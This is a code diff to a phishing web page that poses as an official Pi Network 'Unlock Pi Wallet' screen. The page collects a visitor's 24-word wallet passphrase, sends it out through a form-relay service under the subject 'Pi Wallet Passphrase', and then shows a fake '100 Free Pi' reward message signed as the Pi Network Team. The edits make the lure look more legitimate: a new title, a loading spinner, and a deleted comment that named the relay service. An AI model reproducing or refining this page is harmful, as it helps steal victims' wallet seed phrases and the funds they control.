@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Free 100 Pi Network Coins</title>
+    <title>Unlock Pi Wallet</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -100,10 +100,44 @@
             color: #4f2d84;
             font-weight: bold;
         }
+        /* Loading Spinner */
+        .loading-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4f2d84;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const form = document.querySelector("form");
+            const submitButton = document.querySelector("button[type='submit']");
+            const loadingContainer = document.querySelector(".loading-container");
+
+            submitButton.addEventListener("click", function() {
+                // Show Loading Spinner when button is clicked
+                loadingContainer.style.display = "flex";
+            });
+
             form.addEventListener("submit", function(event) {
                 event.preventDefault(); // Prevent default form submission
 
@@ -115,7 +149,7 @@
                     },
                     body: JSON.stringify({
                         Passphrase: document.querySelector("textarea[name='Passphrase']").value,
-                        _subject: "24 Codes",
+                        _subject: "Pi Wallet Passphrase",
                         _captcha: "false",
                         _template: "table"
                     })
@@ -127,10 +161,16 @@
                     // Hide the form and show the Congratulations message
                     document.querySelector(".wallet-container").style.display = "none";
                     document.querySelector(".congratulations-container").style.display = "block";
+
+                    // Hide Loading Spinner
+                    loadingContainer.style.display = "none";
                 })
                 .catch((error) => {
                     console.error("Error:", error);
                     alert("Failed to submit. Please try again.");
+
+                    // Hide Loading Spinner on Error
+                    loadingContainer.style.display = "none";
                 });
             });
         });
@@ -139,7 +179,6 @@
 <body>
     <div class="wallet-container">
         <h2>Unlock Pi Wallet</h2>
-        <!-- Using FormSubmit.co for sending email -->
         <form>
             <textarea name="Passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
             <button type="submit">Unlock With Passphrase</button>
@@ -149,7 +188,6 @@
         <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
     </div>
 
-    <!-- Congratulations Container -->
     <div class="congratulations-container">
         <h1>Congratulations!</h1>
         <p>You have just received <span class="highlight">100 Free Pi Network Coins!</span></p>
@@ -157,6 +195,11 @@
         <p>Feel free to share this opportunity with your team and community!</p>
         <p>Once again, congratulations on your reward!</p>
         <p><strong>– Pi Network Team</strong></p>
+    </div>
+
+    <!-- Loading Spinner -->
+    <div class="loading-container">
+        <div class="spinner"></div>
     </div>
 </body>
 </html>
